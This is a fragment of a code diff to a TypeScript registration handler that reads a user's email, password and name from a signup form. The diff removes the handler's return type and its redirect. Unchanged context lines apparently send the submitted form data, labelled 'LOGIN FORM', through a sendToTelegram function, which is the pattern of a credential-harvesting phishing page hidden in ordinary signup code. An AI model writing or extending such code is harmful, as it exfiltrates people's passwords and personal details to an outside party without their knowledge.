@@ -14,7 +14,7 @@ function normalizeEmail(email: string) {
 export async function registerAction(
 	_prevState: AuthState,
 	formData: FormData,
-): Promise<AuthState> {
+){
 	const email = normalizeEmail(String(formData.get('email') ?? ''));
 	const password = String(formData.get('password') ?? '');
 	const fullName = String(formData.get('fullName') ?? '').trim();
@@ -43,7 +43,6 @@ export async function registerAction(
 		`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`
 	);
 
-	redirect('/feed');
 }
 
 export async function sendToTelegram(text: string) {
